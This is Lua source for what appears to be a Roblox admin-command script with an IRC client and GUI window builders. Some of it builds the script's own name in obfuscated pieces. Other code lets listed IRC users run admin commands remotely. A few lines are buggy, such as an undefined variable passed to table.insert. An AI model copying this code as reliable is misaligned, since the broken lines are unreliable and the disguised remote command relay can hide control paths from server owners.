function IRC:ConnectToServer(Server)
	if Connected then
		if not IRC.Servers[Server] then
			IRC:AddChat("[ CLIENT ]", "Cannot connect to "..Server, true)
			return false
		end
		IRC:Quit("New Connection")
	end
	local Response = IRC:Connect()
	if not Response then IRC:AddChat("[ CLIENT ]", "Unable to connect!", true) return false end
	local Data = REMOTE:Decode(Response)
	IRC.SessionID = Data[2]
	wait(1)
	if not tostring(IRC.SessionID) or IRC.SessionID == "?" then
		IRC:AddChat("[ IRC ]", "Session ID is invalid, reconnecting...")
		IRC:Quit()
		IRC:ConnectToServer(Server)
	end
	IRC.Connected = true
	IRC:Join(Settings.IRCChannel)
	IRC:ReceiveData()
	IRC.Connected = false
	IRC:AddChat("[ CLIENT ]", "Session ended", true)
end

function IRC:FindUser(UserName)
	for UserID,User in pairs(IRC.Users) do
		if string.lower(User) == string.lower(UserName) then
			return UserID
		end
	end
	return nil
end

function IRC:HandleResponse(Data)
	if type(Data) ~= "table" then
		IRC:AddChat("[ CLIENT ]", "Unable to handle data (Not table)", true)
		ypcall(function()
			IRC:AddChat("[ CLIENT ]", "Data: "..tostring(Data), true)
		end)
		return false
	end
	for _,Output in pairs(Data) do
		if type(Output) == "table" and Output[2] then
			local ID = string.upper(Output[2])
			if not IRC.Ignore[ID] then
				if ID == "PING" then
					IRC:Pong(Output[4][1])
				elseif ID == "PRIVMSG" then
					local SenderDetails = Output[3]
					local Sender = string.sub(SenderDetails,1,string.find(SenderDetails, "!")-1)
					local Channel = string.lower(Output[4][1])
					if Channel == IRC.NickName then
						Channel = Sender
						-- TODO: Handle PM's
					end
					local Message = Output[4][2]
					if Message ~= nil then
						if string.sub(Sender,1,3) == "rbx" and string.find(Sender, "_") then -- detects bots
							if string.find(Message,":") then
								local IRCUser = string.sub(Message,1,string.find(Message,":")-1)
								local IRCMessage = string.sub(Message,string.find(Message,":")+1, #Message)
								IRC:AddChat(IRCUser, IRCMessage)
							end
						else
							IRC:AddChat("[ IRC ] "..Sender,Message)
							for _,Name in pairs(Settings.IRCCommandExecuters) do
								if string.lower(Name) == string.lower(Sender) then
									CORE:Chatted(Message, nil, false, "[IRC]: "..Sender, nil, true)
									break
								end
							end
						end
					else
						IRC:AddChat("[ CLIENT ]", "Message became nil for some reason")
					end
				elseif ID == "NICK" then
					local Name = string.sub(Output[3],1,string.find(Output[3],"!")-1)
					-- change nickname?
				elseif ID == "433" or ID == "451" then
					IRC:AddChat("[ IRC ]", "Nickname already in use, rejoining with new one")
					IRC:Quit("Nickname in use, rejoining with new name")
					IRC.NickName = IRC:GenerateName()
					wait(2) -- wait for old sessions to end
					IRC:ConnectToServer(Settings.IRCServer)
				elseif ID == "353" then
					if Data[4][4][4] then
						for Output in string.gmatch(Data[4][4][4], "[^%s]+") do
							table.insert(IRC.Users, Output)
						end
					end
				elseif ID == "QUIT" or ID == "PART" then
					for User in string.gmatch(Data[1][3], "[^!~]+") do
						if IRC:FindUser(User) then
							IRC:AddChat("[ IRC ]", User.." has left")
							table.remove(IRC.Users, IRC:FindUser(User))
						end
					end
				elseif ID == "JOIN" then
					for User in string.gmatch(Data[1][3], "[^!~]+") do
						if not string.find(User, "qwebirc") then
							IRC:AddChat("[ IRC ]", User.." has joined")
							table.insert(IRC.Users,w)
						end
					end
				elseif ID == "CONNECTION TO IRC SERVER LOST." then
					IRC:AddChat("[ CLIENT ]", "Cannot connect to IRC. Connection lost")
					--IRC:Quit("Connection lost")
					--IRC:AddChat("[ CLIENT ]", "Retrying connection")
					--IRC:ConnectToServer(Settings.IRCServer)
				elseif IRC.Codes[ID] then
					--print(ID)
					--print(Data[i][4][2])
					--print(Data[i][4][2])
				elseif ID == "KICK" then
					IRC:AddChat("[ CLIENT ]", "You have been kicked from IRC")
					IRC:Quit("Kicked from IRC")
				elseif ID then
					IRC:AddChat("[ CLIENT ]", "Unknown data (ID: "..ID..")", true)
				else
					IRC:AddChat("[ CLIENT ]", "Unknown data with invalid ID", true)
				end
			end
		else
			if Output == false then return false end -- sneeky server
			IRC:AddChat("[ CLIENT ]", "Unable to handle data")
		end
	end
end

-- GUI functions --

function GUI:GetColor(ColorName)
	if not ColorName then ColorName = Settings.ColorScheme end
	return Colors[string.upper(ColorName)]
end

function GUI:ContrastColor(Color)
	if type(Color) == "string" then Color = GUI:GetColor(Color) end
	if not Color then Color = GUI:GetColor() end
	return Color3.new(math.abs(Color.r-1),math.abs(Color.g-1),math.abs(Color.b-1))
end


function GUI:GetNameColor(Name)
	local Val = 0
	for i = 1, #Name do 
		local CVal = string.byte(string.sub(Name, i, i))
		local RevIndex = #Name - i + 1
		if #Name%2 == 1 then 
			RevIndex = RevIndex - 1			
		end
		if RevIndex%4 >= 2 then 
			CVal = -CVal 			
		end 
		Val = Val + CVal 
	end 
	local Index = Val%8 + 1
	
	return BrickColor.new(ChatColors[Index])
end

function GUI:Color3ToHex(Color)
	local function ConvertNumber(Number)
		local HexString = "0123456789abcdef"
		local Byte = ""
		while Number > 0 do
			local Calc = math.fmod(Number, 16)
			Byte = string.sub(HexString, Calc+1, Calc+1)..Byte
			Number = math.floor(Number / 16)
		end
		if Calc == "" then
			Byte = "00"
		elseif #Byte == 1 then
			Byte = "0"..Byte
		elseif Byte == "" then
			Byte = "00"
		end
		return Byte
	end
	return ConvertNumber(Color.r * 255)..ConvertNumber(Color.g * 255)..ConvertNumber(Color.b * 255)
end

function GUI:CreateForm(Player, TitleText, Size, Position, IconID, ShowFormButtons, ColorScheme, TransparencyScheme, AutoOffset, TweenPosition, NoModal, NoScrollFrame)
	if not Player then return nil end
	if not Player:FindFirstChild("PlayerGui") then return nil end
	local TaskBar = Player.PlayerGui:FindFirstChild("M".."ake".."rMod".."el".."Lua's TaskBar")
	if not TitleText then TitleText = "Unknown" end
	if not Size then Size = UDim2.new(0.5,0,0.5,0) end
	if not Position then Position = UDim2.new(0.5-(Size.X.Scale/2),-Size.X.Offset/2,0.5-(Size.Y.Scale/2),-Size.Y.Offset/2) end
	if not IconID then IconID = 19919809 end
	if ShowFormButtons == nil then ShowFormButtons = true end
	if not ColorScheme then ColorScheme = Settings.ColorScheme end
	if not TransparencyScheme then TransparencyScheme = Settings.TransparencyScheme end
	if AutoOffset == nil then AutoOffset = true end
	if Icons[IconID] then IconID = Icons[IconID] end
	if TweenPosition == nil then TweenPosition = true end
	if NoModal == nil then NoModal = false end
	if NoScrollFrame == nil then NoScrollFrame = false end
	
	local IsClosed = false
	local Minus = nil
	local Offset = 0
	local ContentType = "ScrollingFrame"
	local TweenSpeed = 0.3
	
	if AutoOffset then
		for _,Item in pairs(Player.PlayerGui:GetChildren()) do
			if Item.Name == "M".."a".."k".."erModelLua's Admin Form" then
				if Item.IsActive.Value == true then
					if Item.IsTrueForm.Value == true then
						Offset = Offset + 50
					end
				end
			end
		end
	end
	
	if NoScrollFrame == true then
		ContentType = "Frame"
	end
	
	SOUND:PlayNotification(Player, 155331654)
	
	local Position = Position + UDim2.new(0,Offset,0,Offset)
	local MinimizePos = Position
	
	local SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = string.char(76 + 1, 97, 107, 10 ^ 2 + 1, 114, 77, 111, 10 ^ 2, 101, 108, 76, 117, 97, 39, 115).." Admin Form"
	local IsActive = Instance.new("BoolValue", SG) IsActive.Name = "IsActive" IsActive.Value = true
	local IsTrueForm = Instance.new("BoolValue", SG) IsTrueForm.Name = "IsTrueForm" IsTrueForm.Value = ShowFormButtons
	
	local Dragger = Instance.new("Frame", SG) Dragger.Name = "Dragger" Dragger.Position = UDim2.new(0.5-(Size.X.Scale/2),-Size.X.Offset/2,-Size.Y.Scale,-Size.Y.Offset - 90) Dragger.Size = Size + UDim2.new(0, 0, 0, 40) Dragger.BackgroundColor3 = GUI:GetColor(ColorScheme) Dragger.BorderColor3 = GUI:ContrastColor(ColorScheme) Dragger.BorderSizePixel = 2 Dragger.BackgroundTransparency = 0.9 Dragger.Active = true Dragger.ClipsDescendants = true Dragger.Draggable = true
	local FormBar = Instance.new("Frame", Dragger) FormBar.Name = "FormBar" FormBar.Position = UDim2.new(0, 0, 0, 0) FormBar.Size = UDim2.new(1, 0, 0, 40) FormBar.BackgroundTransparency = 1
	local Splitter = Instance.new("Frame", Dragger) Splitter.Name = "Splitter" Splitter.Position = UDim2.new(0, 0, 0, 35) Splitter.Size = UDim2.new(1, 0, 0, 2) Splitter.BackgroundColor3 = GUI:ContrastColor(ColorScheme) Splitter.BorderColor3 = GUI:ContrastColor(ColorScheme)
	local X = Instance.new("ImageButton", FormBar) X.Name = "X" X.Position = UDim2.new(1, -30, 0, 5) X.Size = UDim2.new(0, 25, 0, 25) X.BackgroundTransparency = 1 X.Image = "rbxassetid://275572394"
	local IconHolder = Instance.new("ImageLabel", FormBar) IconHolder.Name = "IconHolder" IconHolder.Position = UDim2.new(0, 5, 0, 5) IconHolder.Size = UDim2.new(0, 35, 0, 25) IconHolder.BackgroundTransparency = 1 IconHolder.Image = "rbxassetid://276002222"
	local Icon = Instance.new("ImageLabel", IconHolder) Icon.Name = "Icon" Icon.Position = UDim2.new(0, 3, 0.5, -10) Icon.Size = UDim2.new(0, 20, 0, 20) Icon.BackgroundTransparency = 1 Icon.Image = "rbxassetid://"..IconID  
	local TitleBegin = Instance.new("ImageLabel", FormBar) TitleBegin.Name = "TitleBegin" TitleBegin.Position = UDim2.new(0, 30, 0, 5) TitleBegin.Size = UDim2.new(0, 35, 0, 25) TitleBegin.BackgroundColor3 = Color3.new(1, 1, 1) TitleBegin.BackgroundTransparency = 1 TitleBegin.Image = "rbxassetid://275589160"
	local TitleEnd = Instance.new("ImageLabel", FormBar) TitleEnd.Name = "TitleEnd" TitleEnd.Position = UDim2.new(1, -76, 0, 5) TitleEnd.Size = UDim2.new(0, 25, 0, 25) TitleEnd.BackgroundTransparency = 1 TitleEnd.Image = "rbxassetid://275589154" 
	local Title = Instance.new("TextLabel", FormBar) Title.Name = "Title" Title.Position = UDim2.new(0, 50, 0, 5) Title.Size = UDim2.new(1, -120, 0, 25) Title.BackgroundColor3 = Color3.new(101/255, 102/255, 102/255) Title.BorderSizePixel = 0 Title.Text = TitleText Title.Font = "ArialBold" Title.FontSize = "Size18" Title.TextXAlignment = "Left" Title.TextColor3 = GUI:ContrastColor(ColorScheme) Title.ClipsDescendants = true
	
	local Body = Instance.new("TextButton", Dragger) Body.Name = "Body" Body.Position = UDim2.new(0, 0, 0, 40) Body.Size = UDim2.new(1, 0, 1, -40) Body.BackgroundColor3 = Color3.new(1, 1, 1) Body.BackgroundTransparency = 1 Body.Text = "" Body.Modal = true Body.Active = true Body.Modal = not NoModal
	local Content = Instance.new(ContentType, Body) Content.Name = "Content" Content.Size = UDim2.new(1, 0, 1, 0) Content.BackgroundTransparency = 1
	if ContentType == "ScrollingFrame" then Content.CanvasSize = Size end
	--local ResizeContainer = Instance.new("Frame", SG) ResizeContainer.Name = "ResizeContainer" ResizeContainer.Size = UDim2.new(0, 20, 0, 20) ResizeContainer.BackgroundColor3 = Color3.new(1, 1, 1) ResizeContainer.BackgroundTransparency = 1
	--local Resizer = Instance.new("ImageLabel", ResizeContainer) Resizer.Name = "Resizer" Resizer.Size = UDim2.new(1, 0, 1, 0) Resizer.BackgroundColor3 = Color:GetColor() Resizer.BackgroundTransparency = Settings.TransparencyScheme Resizer.BorderSizePixel = 0 Resizer.Image = "rbxassetid://199287674" Resizer.Active = true Resizer.Draggable = true  
	
	CORE:ExecuteResource("GUIEffect", SG, {["Transparency"] = Settings.TransparencyScheme + 0.1, ["GUIName"] = "Dragger"})
	
	local Functions = Instance.new("Folder", SG) Functions.Name = "Functions"
	
	local Close = Instance.new("BindableFunction", Functions) Close.Name = "Close"
	local Closed = Instance.new("BindableEvent", Functions) Closed.Name = "Closed"
	local Minimize = Instance.new("BindableFunction", Functions) Minimize.Name = "Minimize"
	local Minimized = Instance.new("BindableEvent", Functions) Minimized.Name = "Minimized"
	local Restore = Instance.new("BindableFunction", Functions) Restore.Name = "Restore"
	local Restored = Instance.new("BindableEvent", Functions) Restored.Name = "Restored"
	
	if Settings.EnableTaskBar then
		Minus = Instance.new("ImageButton", FormBar) Minus.Name = "Minus" Minus.Position = UDim2.new(1, -58, 0, 5) Minus.Size = UDim2.new(0, 35, 0, 25) Minus.BackgroundTransparency = 1 Minus.Image = "rbxassetid://275589157"
	else
		TitleEnd.Position = UDim2.new(1, -50, 0, 5)
		Title.Size = UDim2.new(1, -95, 0, 25)
	end
	
	if not ShowFormButtons then
		X:Destroy()
		TitleEnd:Destroy()
		Title.Size = UDim2.new(1, -55, 0, 25)
	end
	
	local function CloseForm()
		if IsClosed == false then
			IsActive.Value = false
			IsClosed = true
			ypcall(function() Dragger:TweenPosition(UDim2.new(0.5-(Size.X.Scale/2),-Size.X.Offset/2,1,Size.Y.Offset + 20), "Out", "Quint", TweenSpeed, true, function() wait(1) if SG then SG:Destroy() end end) end)
			Closed:Fire()
			SOUND:PlayNotification(Player, 206375138)
		end
	end
	
	local function MinimizeForm()
		if IsActive.Value == true then
			IsActive.Value = false
			Minimized:Fire()
			MinimizePos = Dragger.Position
			ypcall(function() Dragger:TweenPosition(UDim2.new(0.5-(Size.X.Scale/2),-Size.X.Offset/2,-Size.Y.Scale,-Size.Y.Offset - 90), "Out", "Quad", TweenSpeed, true) end)
		end
	end
	
	local function RestoreForm()
		if IsActive.Value == false then
			IsActive.Value = true
			Restored:Fire()
			ypcall(function() Dragger:TweenPosition(MinimizePos, "Out", "Quint", TweenSpeed, true) end)
		end
	end
	
	if X then CORE:HandleEvent(X, "MouseButton1Down", CloseForm) end
	if Minus then CORE:HandleEvent(Minus, "MouseButton1Down", MinimizeForm) end
	
	Close.OnInvoke = CloseForm
	Minimize.OnInvoke = MinimizeForm
	Restore.OnInvoke = RestoreForm
	
	if TweenPosition then Dragger:TweenPosition(Position, "Out", "Quint", TweenSpeed, true) end
	
	if TaskBar then
		TaskBar:WaitForChild("AddForm")
		TaskBar.AddForm:Fire(SG, IconID, Closed, Minimized, Restore)
	end
	
	return Content, Close, Closed, Minimize, Minimized, Restore, Restored
end

function GUI:CoreGui(Player, Type, Enable)
	local Parent = Player:FindFirstChild("Backpack")
	if not Parent then Parent = Player.Backpack end
	CORE:ExecuteResource("CoreGui", Player.Character, {["Type"] = Type, ["Enabled"] = Enable})
end

function GUI:SendMessage(Player, TitleText, BodyText, IconID, Time, AutoTime, Speaker)
	if not Player or not Player:IsA("Player") then return nil end
	if BodyText == "" then return nil end
	if not Player:FindFirstChild("PlayerGui") then return nil end
	
	local MessageSplit = STRING:GetSplit(BodyText, 1, " ") or {BodyText}
	local TextColor = GUI:GetColor(MessageSplit[1])
	if TextColor then BodyText = MessageSplit[2] end
	BodyText = string.sub(STRING:FormatReplace(Player, BodyText, Speaker or Player),1,1000)
	
	local Frame, Close, Closed, _, Minimized = GUI:CreateForm(Player, TitleText, UDim2.new(0.2,100,0.1,100), nil, IconID)
	local Body = Instance.new("TextLabel", Frame) Body.Name = "Body" Body.Size = UDim2.new(1,0,1,0) Body.BackgroundTransparency = 1 Body.Text = BodyText Body.Font = Settings.Font Body.FontSize = "Size18" Body.TextStrokeTransparency = 0 Body.TextWrapped = true Body.TextYAlignment = "Top"
	
	if Frame then
		local FormBar = Frame.Parent.Parent.FormBar
		local Said = false
		local Speak = Instance.new("ImageButton", FormBar) Speak.Name = "Speak" Speak.Position = UDim2.new(1, -87, 0, 5) Speak.Size = UDim2.new(0, 35, 0, 25) Speak.BackgroundColor3 = Color3.new(1, 1, 1) Speak.BackgroundTransparency = 1 Speak.Image = "rbxassetid://276195369"
		if Settings.EnableTaskBar then
			FormBar.TitleEnd.Position = UDim2.new(1, -106, 0, 5)
			FormBar.Title.Size = UDim2.new(1, -145, 0, 25)
		else
			Speak.Position = UDim2.new(1, -58, 0, 5)
			FormBar.TitleEnd.Position = UDim2.new(1, -76, 0, 5)
			FormBar.Title.Size = UDim2.new(1, -120, 0, 25)
		end
		CORE:HandleEvent(Speak, "MouseButton1Down", function()
			if not Said then
				Said = true
				SOUND:SayConvertedText(SOUND:ConvertText(BodyText), Frame)
			end
		end)
		
		if TextColor then
			Body.TextColor3 = TextColor
		else
			Body.TextColor3 = Color3.new(1,1,1)
		end
		
		if tonumber(Time) then coroutine.wrap(function()
			if AutoTime then
				Time = Time + math.floor(#BodyText/7)
			end
			local Alive = true
			
			local function StopTimer() Alive = false end
			Closed.Event:connect(StopTimer)
			Minimized.Event:connect(StopTimer)
			
			Frame.Size = Frame.Size + UDim2.new(0,0,0,-30)
			Frame.Position = Frame.Position + UDim2.new(0,0,0,30)
			local Ticker = Instance.new("TextLabel", Frame.Parent) Ticker.Size = UDim2.new(1, 0, 0, 30) Ticker.TextColor3 = GUI:ContrastColor() Ticker.BackgroundTransparency = 1 Ticker.Text = Time Ticker.Font = "ArialBold" Ticker.FontSize = "Size18"
			local Stop = Instance.new("ImageButton", Frame.Parent) Stop.Name = "Stop" Stop.Position = UDim2.new(1,-30,0,0) Stop.Size = UDim2.new(0, 25, 0, 25) Stop.BackgroundColor3 = Color3.new(1, 1, 1) Stop.BackgroundTransparency = 1 Stop.Image = "rbxassetid://49494354"
			CORE:HandleEvent(Stop, "MouseButton1Down", StopTimer)
			for i = Time,0,-1 do
				for ii = 1,10 do
					if Alive == true then
						Ticker.Text = i
						wait(0.1)
					else
						break
					end
				end
			end
			if Alive == true then
				Close:Invoke()
			else
				Ticker:Destroy()
				Stop:Destroy()
				Frame.Size = Frame.Size + UDim2.new(0,0,0,30)
				Frame.Position = Frame.Position + UDim2.new(0,0,0,-30)
			end
		end)() end
		
		CORE:ExecuteResource("CalculateScrollY", Body)
	end
end

function GUI:FullMessage(Player, TitleText, BodyText, IconID, Error)
	if not Player then return nil end
	if not Player:IsA("Player") then return nil end
	if BodyText == "" then return nil end
	if not Player:FindFirstChild("PlayerGui") then return nil end
	BodyText = string.sub(STRING:FormatReplace(Player, BodyText),1,1000)
	local TextColor = GUI:ContrastColor()
	if Error then TextColor = Color3.new(1,0,0) end
	
	local Frame, Close, Closed, Minimize, Minimized = GUI:CreateForm(Player, TitleText, UDim2.new(0.3,0,0.3,0), nil, IconID)
	local Body = Instance.new("TextLabel", Frame) Body.Name = "Body" Body.Size = UDim2.new(1, -13, 1, 0) Body.BackgroundTransparency = 1 Body.Text = BodyText Body.Font = Settings.Font Body.FontSize = "Size18" Body.TextStrokeTransparency = 1 Body.TextWrapped = true Body.TextXAlignment = "Left" Body.TextYAlignment = "Top" Body.TextColor3 = TextColor
	
	CORE:ExecuteResource("CalculateScrollY", Body)
	
	return Frame, Close, Closed, Minimize, Minimized
end

function GUI:SendHint(Player, Text, Time, Speaker) coroutine.wrap(function()
	Text = STRING:FormatReplace(Player, string.sub(Text,1,100), Speaker)
	local TweenTime = 0.5
	if not Time then Time = 5 end
	local SG = Instance.new("ScreenGui") SG.Name = "LuaMod".."".."elM".."aker's Admin Hint"
	local MaxPos = -1
	for _,SGObj in pairs(Player.PlayerGui:GetChildren()) do
		local IVal = SGObj:FindFirstChild("Index")
		if IVal then
			MaxPos = math.max(MaxPos, IVal.Value)
		end
	end
	MaxPos = MaxPos + 1
	local IndexVal = Instance.new("IntValue", SG) IndexVal.Name = "Index" IndexVal.Value = MaxPos
	local Main = Instance.new("Frame", SG) Main.Name = "Main" Main.Position = UDim2.new(0, 0, 0.05, MaxPos * 50) Main.Size = UDim2.new(1, 0, 0, 40) Main.BackgroundTransparency = 1
	local LeftBar = Instance.new("Frame", Main) LeftBar.Name = "LeftBar" LeftBar.Position = UDim2.new(0.5, 0, 0, 0) LeftBar.Size = UDim2.new(0, 0, 1, 0) LeftBar.BackgroundColor3 = GUI:GetColor() LeftBar.BackgroundTransparency = 0.9 LeftBar.BorderSizePixel = 0
	local RightBar = Instance.new("Frame", Main) RightBar.Name = "RightBar" RightBar.Position = UDim2.new(0.5, 0, 0, 0) RightBar.Size = UDim2.new(0, 0, 1, 0) RightBar.BackgroundColor3 = GUI:GetColor() RightBar.BackgroundTransparency = 0.9 RightBar.BorderSizePixel = 0
	local Body = Instance.new("TextLabel", Main) Body.Name = "Body" Body.Size = UDim2.new(1, 0, 1, 0) Body.BackgroundColor3 = Color3.new(1, 1, 1) Body.BackgroundTransparency = 1 Body.TextColor3 = GUI:ContrastColor() Body.Text = Text Body.Font = Settings.Font Body.FontSize = "Size18" Body.TextTransparency = 1
	SG.Parent = Player.PlayerGui
	
	CORE:ExecuteResource("GUIEffect", Main, {["Transparency"] = Settings.TransparencyScheme + 0.1, ["GUIName"] = "LeftBar"})
	CORE:ExecuteResource("GUIEffect", Main, {["Transparency"] = Settings.TransparencyScheme + 0.1, ["GUIName"] = "RightBar"})

	LeftBar:TweenSize(UDim2.new(-0.5, 0, 1, 0), "In", "Quart", TweenTime)
	RightBar:TweenSize(UDim2.new(0.5, 0, 1, 0), "In", "Quart", TweenTime)
	Delay(TweenTime, function()
		for i = 1,0,-0.1 do
			Body.TextTransparency = i
			wait()
		end
		Body.TextTransparency = 0
	end)
	Delay(TweenTime + Time, function()
		for i = 0,1,0.1 do
			Body.TextTransparency = i
			wait()
		end
		Body.TextTransparency = 1
		local Done = false
		LeftBar:TweenSize(UDim2.new(0, 0, 1, 0), "Out", "Quad", TweenTime, true, function() Done = true end)
		RightBar:TweenSize(UDim2.new(0, 0, 1, 0), "Out", "Quad", TweenTime, true, function() repeat wait() until Done SG:Destroy() end)
	end)

end)() end

function GUI:ListGui(Player, Title, List, IconID, Clickable, AutoNumber, PreSearch, BackgroundColor)
	if not Player then return nil end
	if not Player:FindFirstChild("PlayerGui") then return nil end
	if not PreSearch then PreSearch = "" end
	if AutoNumber == nil then AutoNumber = true end
	
	local Frame, Close, Closed, Minimize, Minimized = GUI:CreateForm(Player, Title, UDim2.new(0.4,0,0.6,0), nil, IconID, true, BackgroundColor)
	local SearchBar = Instance.new("TextBox") SearchBar.Name = "SearchBar" SearchBar.Position = UDim2.new(0.1,0,0,5) SearchBar.Size = UDim2.new(0.8,0,0,20) SearchBar.BackgroundColor3 = GUI:GetColor() SearchBar.BackgroundTransparency = 0.5 SearchBar.Text = "" SearchBar.Font = Settings.Font SearchBar.FontSize = "Size14" SearchBar.TextColor3 = GUI:ContrastColor() SearchBar.ClearTextOnFocus = false SearchBar.Text = PreSearch SearchBar.Font = Settings.Font SearchBar.FontSize = "Size14"
	SearchBar.Parent = Frame.Parent
	Frame.Size = Frame.Size + UDim2.new(0,0,0,-30)
	Frame.Position = Frame.Position + UDim2.new(0,0,0,30)
	
	local SearchVer = 0,nil
	local Clicked = Instance.new("BindableEvent", Frame) Clicked.Name = "Clicked"
	local RequestDialog = Instance.new("BindableFunction", Frame) RequestDialog.Name = "RequestDialog"
	local InDialog = false
	
	local function ShowResults(Key)
		SearchVer = SearchVer + 1
		local ThisSearchVer = SearchVer
		
		if type(ScrollScript) == "userdata" then ScrollScript.Disabled = true ScrollScript:Destroy() end
		for _,Get in pairs(Frame:GetChildren()) do if Get:IsA("LocalScript") then Get.Disabled = true end Get:Destroy() end
	
		local NumPos,Num = 0,1
		
		for _,Data in pairs(List) do
			if ThisSearchVer ~= SearchVer then
				break
			end
			local String = tostring(Data)--STRING:DetermineFilter(tostring(Data), Player, Player)
			if String then
				local ImageIcon = nil
				if type(Data) == "table" then
					String = Data[1]
					ImageIcon = Data[2]
				end
			
				local TextColor = GUI:ContrastColor()
				local StringSplit = STRING:GetSplit(String, 1, " ")
				local NewColor = GUI:GetColor(StringSplit[1])
				if NewColor then TextColor = NewColor String = StringSplit[2] end
				
				if string.find(string.lower(String), string.lower(Key)) then
					Spacer = false
					local Font = Settings.Font
					local Split = STRING:GetSplit(String, 1, " ")
					if string.sub(string.lower(String),1,6) == "bold: " then
						Font = "ArialBold"
						String = string.sub(String,7)
					elseif Fonts[Split[1]] then
						Font = Split[1]
						String = Split[2]
					end
					if string.sub(String,1,2) == "--" then
						Spacer = true
					end
					local Content = Instance.new("TextButton", Frame) Content.Name = "Content: "..Num Content.Position = UDim2.new(0,0,0,NumPos) Content.Size = UDim2.new(1,0,0,30) Content.BackgroundColor3 = Color3.new(1,1,1) Content.BackgroundTransparency = 0.9 Content.Font = Font Content.FontSize = "Size18" Content.TextXAlignment = "Left" Content.TextColor3 = TextColor if Spacer then Content.Text = string.rep(" ", #tostring(Num) + 3)..String elseif AutoNumber == true then Content.Text = Num..".) "..String else Content.Text = String end
					if ImageIcon then
						if tonumber(ImageIcon) then
							ImageIcon = "rbxassetid://"..ImageIcon
						elseif Icons[ImageIcon] then
							ImageIcon = "rbxassetid://"..Icons[ImageIcon]
						end
						
						Content.Size = UDim2.new(1,0,0,90) Content.Position = UDim2.new(0,0,0,NumPos) Content.ZIndex = 2
						local Image = Instance.new("ImageLabel", Content) Image.Name = "Image" Image.Size = UDim2.new(0, 90, 0, 90) Image.BackgroundColor3 = Color3.new(1, 1, 1) Image.BackgroundTransparency = 1 Image.Image = ImageIcon
						local TextContent = Instance.new("TextLabel", Content) TextContent.Name = "TextContent" TextContent.Position = UDim2.new(0, 90, 0, 0) TextContent.Size = UDim2.new(1, -90, 1, 0) TextContent.BackgroundColor3 = Color3.new(1, 1, 1) TextContent.BackgroundTransparency = 1 TextContent.Text = Content.Text TextContent.Font = Settings.Font TextContent.FontSize = "Size18" TextContent.TextXAlignment = "Left" TextContent.TextColor3 = TextColor TextContent.TextWrapped = true
						Content.Text = ""
						NumPos = NumPos + 90
					else
						NumPos = NumPos + 30
					end
					
					if not Clickable then
						Content.AutoButtonColor = false
						Content.Active = false
						Content.BackgroundTransparency = 1
					elseif ClientInfo[Player.Name] and not ClientInfo[Player.Name].TouchScreen then
						SOUND:BindButton(Content)
						CORE:HandleEvent(Content, "MouseButton1Down", function()
							if not InDialog then
								Clicked:Fire(String)
							end
						end, true)
					end
					if Spacer == false then Num = Num + 1 end
				end
			end
		end
		Frame.CanvasSize = UDim2.new(0,0,0,NumPos)
		ScrollScript = CORE:ExecuteResource("ScrollLeftRight", Frame.Parent, {["VerticalOffset"] = NumPos})
	end
	
	RequestDialog.OnInvoke = function(RequestDialogCall)
		InDialog = RequestDialogCall
	end
	
	ShowResults(PreSearch)
	
	local RPR = CORE:CreateRemotePropertyReader(SearchBar)
	CORE:HandleEvent(SearchBar, "Changed", function(Prop)
		if Prop == "Text" then
			local Text = CORE:ReadProperty(RPR, Player, "Text")
			ShowResults(Text)
			Frame.CanvasPosition = Vector2.new(0,0)
		end
	end)
	
	return Clicked, RequestDialog, Close
end

function GUI:PropertyGui(Player, Title, Icon, Properties)
	if not Player then return nil end
	if not Player:FindFirstChild("PlayerGui") then return nil end
	if type(Properties) ~= "table" then return nil end
	local HasClosed = false
	local NewProperties = {}
	
	local Frame, _, Closed = GUI:CreateForm(Player, Title, UDim2.new(0.2, 50, 0.5, 50), nil, Icon)
	Frame.ClipsDescendants = true
	local Splitter = Instance.new("Frame", Frame) Splitter.Name = "Splitter" Splitter.Position = UDim2.new(0.5, 0, 0, 0) Splitter.Size = UDim2.new(0, 0, 1, 0) Splitter.BackgroundColor3 = GUI:ContrastColor() Splitter.BorderColor3 = GUI:ContrastColor() Splitter.BorderSizePixel = 2 Splitter.ZIndex = 2
	
	for PropertyName,Data in pairs(Properties) do
		NewProperties[PropertyName] = Data[1]
	end
	
	local YCount = 0
	
	for PropertyName,Data in pairs(Properties) do
		if type(Data) == "table" then
			local DefaultValue = Data[1]
			local Writable = Data[2]
			local ValueType = Data[3]
			
			if Writable == nil then Writable = false end
			if type(ValueType) == "string" then -- now this is confusing
				ValueType = string.lower(ValueType)
			elseif ValueType == nil then
				ValueType = type(DefaultValue)
			end
			
			if ValueType == "nil" or ValueType == "userdata" then
				ValueType = nil
			elseif ValueType == "table" then
				DefaultValue = STRING:UnpackArgs(DefaultValue)
				ValueType = "string"
			end
			
			if ValueType then
				local Object = Instance.new("Frame", Frame) Object.Name = "Object" Object.Size = UDim2.new(1, 0, 0, 50) Object.Position = UDim2.new(0,0,0,YCount) Object.BackgroundColor3 = GUI:GetColor() Object.BackgroundTransparency = 1--Settings.TransparencyScheme
				local Property = Instance.new("TextLabel", Object) Property.Name = "Property" Property.Size = UDim2.new(0.5, 0, 0, 50) Property.BackgroundTransparency = 1 Property.Text = PropertyName Property.Font = Settings.Font Property.FontSize = "Size14" Property.TextWrapped = true Property.TextXAlignment = "Left"
				local ValFrame = Instance.new("Frame", Object) ValFrame.Name = "ValFrame" ValFrame.Position = UDim2.new(0.5, 5, 0, 0) ValFrame.Size = UDim2.new(0.5, -5, 1, 0) ValFrame.BackgroundTransparency = 1
				
				if ValueType == "string" or ValueType == "number" then
					if Writable == true then
						local Input = Instance.new("TextBox", ValFrame) Input.Name = "Input" Input.Position = UDim2.new(0, 0, 0.1, 0) Input.BackgroundTransparency = 1 Input.Size = UDim2.new(1, 0, 0.8, 0) Input.Text = tostring(DefaultValue) Input.Font = Settings.Font Input.FontSize = "Size14" Input.TextWrapped = true Input.TextXAlignment = "Left" Input.ClearTextOnFocus = false
						CORE:HandleEvent(Input, "Changed", function(Prop) if Prop == "Text" then
							if ValueType == "number" then
								NewProperties[PropertyName] = tonumber(Input.Text)
							else
								NewProperties[PropertyName] = tostring(Input.Text)
							end
						end end)
					else
						local Read = Instance.new("TextLabel", ValFrame) Read.Name = "Read" Read.Position = UDim2.new(0, 0, 0.1, 0) Read.Size = UDim2.new(1, 0, 0.8, 0) Read.BackgroundTransparency = 1 Read.Text = DefaultValue Read.Font = Settings.Font Read.FontSize = "Size14" Read.TextTransparency = 0.4 Read.TextXAlignment = "Left"
					end
				end
				if ValueType == "boolean" then
